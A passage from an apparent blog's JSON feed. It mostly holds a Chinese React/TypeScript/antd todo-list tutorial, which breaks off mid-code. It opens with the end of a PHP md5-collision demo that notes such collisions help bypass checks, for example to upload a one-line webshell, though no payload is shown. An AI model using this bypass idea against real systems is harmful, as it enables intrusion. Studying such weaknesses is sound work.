variable\">$b</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// bool(false)</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// bool(true)</span>\n</span></code></pre></div><p>md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木马[<a href=\"https://www.cnblogs.com/ainsliaea/p/15126218.html#fn2\" target=\"_blank\" rel=\"noopener noreferrer\">2]</a>。</p>\n",
      "date_published": "2024-08-12T06:54:53.000Z",
      "date_modified": "2024-11-13T10:11:39.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "React Typescript antd",
      "url": "https://echo0d.github.io/DailyNotes/develop/FrontEnd/React_Typescript_antd.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/FrontEnd/React_Typescript_antd.html",
      "summary": "React Typescript antd\n\nhttps://zhuanlan.zhihu.com/p/659137798 教程共9节，从环境搭建讲到多页签\n\n环境搭建\n安装nodejs\n安装React脚手架工具\n（管理员身份运行）\n创建项目\n（同样管理员身份，项目名全部小写）\n启动前端验证\n启动前端工程后，会自动打开默认浏览器访问http://loc...",
      "content_html": "\n<blockquote>\n<p><a href=\"https://zhuanlan.zhihu.com/p/659137798\" target=\"_blank\" rel=\"noopener noreferrer\">https://zhuanlan.zhihu.com/p/659137798</a> 教程共9节，从环境搭建讲到多页签</p>\n</blockquote>\n<h2>环境搭建</h2>\n<h3>安装nodejs</h3>\n<h3>安装React脚手架工具</h3>\n<p>（管理员身份运行）</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">npm</span> i create-react-app <span class=\"token parameter variable\">-g</span>\n</code></pre></div><h3>创建项目</h3>\n<p>（同样管理员身份，项目名全部小写）</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>create-react-app reactdemo <span class=\"token parameter variable\">--template</span> typescript\n<span class=\"token builtin class-name\">cd</span> reactdemo\n<span class=\"token function\">npm</span> i antd <span class=\"token parameter variable\">--save</span> <span class=\"token comment\"># 为刚刚创建的前端工程增加antd UI支持</span>\n</code></pre></div><h3>启动前端验证</h3>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">npm</span> run start\n</code></pre></div><p>启动前端工程后，会自动打开默认浏览器访问http://localhost:3000，如果浏览器页面出现以下界面，说明安装环境搭建成功：</p>\n<figure><figcaption>image.png</figcaption></figure>\n<h3>工程目录结构简单说明</h3>\n<p>node_modules目录：和其他的npm工程一样，主要保存工程所依赖的包，包括react等，这个目录下的资源一般我们直接使用即可。\npublic目录：工程静态资源，比较重要的是index.html，用于渲染React前端组件，也是前端工程的入口页面。这个目录下的资源一般不需要改动，除非有特别的需求。\nsrc目录：前端工程的主要目录，我们编写的前端组件主要也是位于这些目录下。\n之所以你能看React的默认页面，其实就是public\\index.html提供了一个id为root的div挂载点，通过src\\index.tsx文件挂载了src\\app.tsx文件。</p>\n<h2>Hello world</h2>\n<h3>修改端口号</h3>\n<p>打开src目录下的package.json文件，找到\"start\": \"react-scripts start\"，修改为\"start\": \"set PORT=8080 &amp;&amp; react-scripts start\"，端口号修改为8080。</p>\n<h3>创建新的index.tsx</h3>\n<p>创建项目时候默认生成了，可以直接全部删掉，或者将原本的index.tsx备份一下，修改为</p>\n<div class=\"language-tsx\" data-ext=\"tsx\" data-title=\"tsx\"><pre class=\"language-tsx\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> ReactDOM <span class=\"token keyword\">from</span> <span class=\"token string\">'react-dom/client'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> root <span class=\"token operator\">=</span> ReactDOM<span class=\"token punctuation\">.</span><span class=\"token function\">createRoot</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'root'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HTMLElement<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nroot<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">React.StrictMode</span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token plain-text\">\n        </span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token plain-text\">Hello world</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token plain-text\">\n    </span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span><span class=\"token class-name\">React.StrictMode</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>修改完成后，打开VSCode的终端，执行npm run start命令，就会看到一个Hello World</p>\n<h2>todo list</h2>\n<p>将开发一个具备添加和删除的待办列表功能，主要学习React的state和触发事件的代码编写知识。</p>\n<h3>功能描述</h3>\n<p>该功能的基本界面包括一个输入框、一个添加按钮、一个删除按钮和一个显示任务列表的控件。在输入框中输入任务名称，点击添加按钮后将刚刚输入的任务加入到列表中；勾选已完成的任务，点击删除按钮删除选中的任务。</p>\n<h3>界面设计</h3>\n<p>可以用ppt画出一个草图，设计这个todo list的UI，草图如下：</p>\n<figure><figcaption>image.png</figcaption></figure>\n<h3>创建静态UI</h3>\n<p>根据草图，使用antd的栅格系统将页面划分成对应的区域，并在相应位置存放页面元素，修改后的DemoApp.tsx文件内容如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Input<span class=\"token punctuation\">,</span> Button<span class=\"token punctuation\">,</span> Row<span class=\"token punctuation\">,</span> Col<span class=\"token punctuation\">,</span> Checkbox <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'antd'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">DemoApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n        <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>h1 style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string-property property\">\"textAlign\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"center\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>待办列表<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>hr<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>hr<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>Row align<span class=\"token operator\">=</span><span class=\"token string\">'middle'</span> gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>任务标题<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">11</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>Input<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Input<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">'primary'</span><span class=\"token operator\">&gt;</span>添加<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>Row<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">24</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                    <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n                        <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>Checkbox<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Checkbox<span class=\"token operator\">&gt;</span>任务一<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n                        <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>Checkbox<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Checkbox<span class=\"token operator\">&gt;</span>任务二<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n                    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>Row gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                    <span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">'primary'</span><span class=\"token operator\">&gt;</span>删除<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> DemoApp<span class=\"token punctuation\">;</span>\n</code></pre></div><p>\n此时，在第二行以解构赋值的形式导入了antd的基础组件，在函数式组件DemoApp函数的返回值中根据设计，返回对应的页面元素。（相关源码细节比如align、gutter等属性的作用，可参考antd相关文档。）\nTSX使用大括号语法来嵌入值，在大括号中可以书写的是任意合法的typescript变量或合法的typescript表达式。\n在TSX的页面标签style元素中直接内嵌css表达式时，需要使用 <code>{{css表达式}}</code>的形式，注意这里css的属性是去掉css属性中的<code>-</code>，且将<code>-</code>后面的第一个字符变为大写（驼峰式)，例如：css属性text-align需要写成textAlign，css属性background-color需要写成backgroundColor。</p>\n<h3>组件状态</h3>\n<p>React组件状态就是state，是一个组件所包含的状态信息。所谓“状态”，就是该组件任意时刻都存放的各种数据。 当组件更新state时，会触发组件的重新渲染，可以认为发生了局部刷新。\ntodo list有两个state：一个是输入框对应的新增任务名称，另外一个是保存已添加的任务列表。使用 <code>React.useState</code>函数，定义组件状态，在函数DemoApp中，return语句前增加state的定义代码：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>dataInfo<span class=\"token punctuation\">,</span> setDataInfo<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> React<span class=\"token punctuation\">.</span><span class=\"token function\">useState</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    taskName<span class=\"token operator\">:</span> <span class=\"token string\">'新任务名称'</span><span class=\"token punctuation\">,</span>\n    taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"编写React教程\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"吃饭\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"睡觉\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>React在函数组件中初始化state对象：调用<code>React.useState</code>函数定义了一个数组，第一个元素是定义了名称为<code>dataInfo</code>的<code>state</code>对象，第二个元素是修改<code>state</code>数据的函数，后续当修改<code>state</code>值时需要调用这个函数，从而触发页面元素重新渲染的动作。\n然后再将<code>taskName</code>和输入框绑定，并在页面上显示已有的任务列表，修改后<code>DemoApp.tsx</code>文件内容如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">\"react\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Input<span class=\"token punctuation\">,</span> Button<span class=\"token punctuation\">,</span> Row<span class=\"token punctuation\">,</span> Col<span class=\"token punctuation\">,</span> Checkbox <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"antd\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">DemoApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>dataInfo<span class=\"token punctuation\">,</span> setDataInfo<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> React<span class=\"token punctuation\">.</span><span class=\"token function\">useState</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    taskName<span class=\"token operator\">:</span> <span class=\"token string\">\"新任务名称\"</span><span class=\"token punctuation\">,</span>\n    taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"编写React教程\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"吃饭\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"睡觉\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>h1 style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> textAlign<span class=\"token operator\">:</span> <span class=\"token string\">\"center\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>待办列表<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>hr<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>hr<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row align<span class=\"token operator\">=</span><span class=\"token string\">\"middle\"</span> gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>任务标题<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">11</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** value属性与state对象中的taskName绑定 */</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span>Input value<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Input<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">\"primary\"</span><span class=\"token operator\">&gt;</span>添加<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">24</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">{</span>\n              dataInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">,</span>index<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> \n                <span class=\"token operator\">&lt;</span>li key<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>Checkbox<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Checkbox<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">{</span>item<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">\"primary\"</span><span class=\"token operator\">&gt;</span>删除<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> DemoApp<span class=\"token punctuation\">;</span>\n\n</code></pre></div><p>可以看到输入框中显示了state中taskName属性的值，任务列表区也显示了taskList数组中的数据。\n这里因为使用循环输出了数据的值，所以为每项<code>&lt;li&gt;</code>标签增加了key属性，否则在浏览器的开发者工具中会出现元素缺少key属性的警告。</p>\n<figure><figcaption>image.png</figcaption></figure>\n<h3>为Input绑定onChange事件</h3>\n<p>此时输入框还无法输出文字，因为值一直是原本的<code>taskname</code>，要产生修改<code>state</code>的效果，需要为<code>Input</code>绑定<code>onChange</code>事件。也就是说：当<code>Input</code>中的值发生改变时会触发<code>onChange</code>，在<code>onChange</code>事件的处理函数中，我们需要同步修改<code>state</code>中的<code>taskName</code>属性的值。修改后的DemoApp.tsx内容如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">\"react\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Input<span class=\"token punctuation\">,</span> Button<span class=\"token punctuation\">,</span> Row<span class=\"token punctuation\">,</span> Col<span class=\"token punctuation\">,</span> Checkbox <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"antd\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">DemoApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>dataInfo<span class=\"token punctuation\">,</span> setDataInfo<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> React<span class=\"token punctuation\">.</span><span class=\"token function\">useState</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    taskName<span class=\"token operator\">:</span> <span class=\"token string\">\"新任务名称\"</span><span class=\"token punctuation\">,</span>\n    taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"编写React教程\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"吃饭\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"睡觉\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">taskNameChange</span><span class=\"token punctuation\">(</span>newTaskname<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    newStateInfo<span class=\"token punctuation\">.</span>taskName <span class=\"token operator\">=</span> newTaskname<span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>h1 style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> textAlign<span class=\"token operator\">:</span> <span class=\"token string\">\"center\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>待办列表<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>hr<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>hr<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row align<span class=\"token operator\">=</span><span class=\"token string\">\"middle\"</span> gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>任务标题<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">11</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** value属性与state对象中的taskName绑定 */</span><span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 增加onChange事件处理 */</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span>Input value<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span> onChange<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token function\">taskNameChange</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Input<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">\"primary\"</span><span class=\"token operator\">&gt;</span>添加<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n      